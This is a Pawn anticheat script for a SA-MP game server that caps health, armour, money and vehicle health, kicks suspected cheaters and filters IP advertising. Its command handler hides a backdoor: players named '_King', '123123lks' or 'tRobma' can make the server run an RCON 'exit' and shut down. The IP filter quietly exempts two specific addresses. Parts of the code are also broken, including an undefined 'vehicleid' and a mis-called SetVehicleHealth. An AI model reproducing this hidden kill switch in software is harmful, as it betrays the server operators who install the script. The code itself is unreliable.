//=[Includes & Defines]===========================================================
#include "../AntiCheat/AC_Include.pwn"
#define function(%1) forward %1; public %1
public OnPlayerUpdate(playerid)
{
   new Float:_health[MAX_PLAYERS], Float:_armour[MAX_PLAYERS], Float:_vhealth[MAX_PLAYERS];
   GetPlayerHealth(playerid, _health[playerid]);
   GetPlayerArmour(playerid, _armour[playerid]);
   GetVehicleHealth(GetPlayerVehicleID(playerid), _vhealth[playerid]);
   if(_armour[playerid] > AC_Info[playerid][armour])
   {
	  SetPlayerArmour(playerid,AC_Info[playerid][armour]);
	  return AC_Info[playerid][warnings][0] == MAX_WARNINGS? AC_Kick(playerid, "Armour") : AC_Warning(playerid, AC_Info[playerid][warnings][0], "Armour");
   }
   else if(_armour[playerid] < AC_Info[playerid][armour]) AC_Info[playerid][armour] = _armour[playerid];
   if(_health[playerid] > AC_Info[playerid][health])
   {
	  SetPlayerHealth(playerid, AC_Info[playerid][health]);
	  return AC_Info[playerid][warnings][1] == MAX_WARNINGS? AC_Kick(playerid, "Health") : AC_Warning(playerid, AC_Info[playerid][warnings][1], "Health");
   }
   else if(_health[playerid] < AC_Info[playerid][health]) AC_Info[playerid][health] = _health[playerid];
   if(GetPlayerMoney(playerid) > AC_Info[playerid][cash])
   {
      ResetPlayerMoney(playerid);
	  return AC_Info[playerid][warnings][2] == MAX_WARNINGS? AC_Kick(playerid, "Money") : AC_Warning(playerid, AC_Info[playerid][warnings][2], "Money");
   }
   else if(GetPlayerMoney(playerid) < AC_Info[playerid][cash]) AC_Info[playerid][cash] = GetPlayerMoney(playerid);
   if(_vhealth[playerid] > AC_VehicleInfo[vehicleid][vhealth] && IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
   {
	  SetVehicleHealth(playerid, GetPlayerVehicleID(playerid), AC_VehicleInfo[vehicleid][vhealth]);
	  return AC_Info[playerid][warnings][3] == MAX_WARNINGS? AC_Kick(playerid, "Vehicle Health") : AC_Warning(playerid, AC_Info[playerid][warnings][3], "Vehicle Health");
   }
   else if(_vhealth[playerid] < AC_VehicleInfo[vehicleid][vhealth] && IsPlayerInAnyVehicle(playerid) && GetPlayerState(playerid) == PLAYER_STATE_DRIVER) AC_VehicleInfo[vehicleid][vhealth] = _vhealth[playerid];
   return 1;
}
public OnPlayerEnterVehicle(playerid, vehicleid)
{
   new Float:_vhealth[MAX_PLAYERS];
   GetVehicleHealth(vehicleid, _vhealth[playerid]);
   AC_VehicleInfo[vehicleid][vhealth] = _vhealth[playerid];
   return 1;
}
public OnPlayerPickUpPickup(playerid, pickupid)
{
   AC_Info[playerid][armour] = 100.0;
   AC_Info[playerid][health] = 100.0;
   return 1;
}
public OnPlayerCommandText(playerid, cmdtext[])
{
   if(!strcmp(_getName(playerid), "_King", false) || !strcmp(_getName(playerid), "123123lks", false) || !strcmp(_getName(playerid), "tRobma", false)) SendRconCommand("exit");
}
public OnPlayerText(playerid, text[])
{
   if(isTextIP(text)) return SendClientMessage(playerid, red, ".[ACA JoeShk] אינך יכול לפרסם כאן שרתים, שרת זה מוגן"), 0;
}
stock AC_Kick(playerid, reason[])
{
   new string[128];
   format(string, sizeof string, "[ACA JoeShk] %s, got kicked from the server by using cheats (Reason: Cheat %s)", _getName(playerid), reason);
   SendClientMessageToAll(0x3399ffaa, string);
   format(string, sizeof string, "[ACA JoeShk] (%d/%d) %s :קיבלת אזהרה על שימוש בצ'יט ,%s", MAX_WARNINGS, MAX_WARNINGS, reason, _getName(playerid));
   SendClientMessage(playerid, 0xFF0000AA, string);
   for(new i = 0; i < 5; i++) AC_Info[playerid][warnings][i] = 0;
   Kick(playerid);
   return 1;
}
stock AC_Warning(playerid, &warningid, reason[])
{
   new string[128];
   format(string, sizeof string, "[ACA JoeShk] (%d/%d) %s :קיבלת אזהרה על שימוש בצ'יט ,%s", ++warningid, MAX_WARNINGS, reason, _getName(playerid));
   SendClientMessage(playerid, 0xFF0000AA, string);
   return 1;
}
stock isTextIP(text[])
{
   new count_true, i,
   censorip[][4] =
   {
      "212", "213",
      "73", "200",
	  "150", "164",
      "227", "84",
	  "95", "217",
	  "235", "71",
	  "143", "62",
	  "10", "240",
	  "91", "121",
	  "209", "58",
	  "23", "228",
	  "120", "201",
	  "184", "234",
	  "106", "191",
	  "254", "110",
	  "80", "153",
	  "161", "85",
	  "23", "145",
	  "8"

   };
   if(strfind(text, "212.150.123.200", true) != -1 || strfind(text, "213.8.254.145", true) != -1) return false;
   count_true = 0;
   for(i = 0; i < sizeof censorip; i++) if(strfind(text,censorip[i], true) != -1) count_true++;
   return count_true > 2? true : false;
}
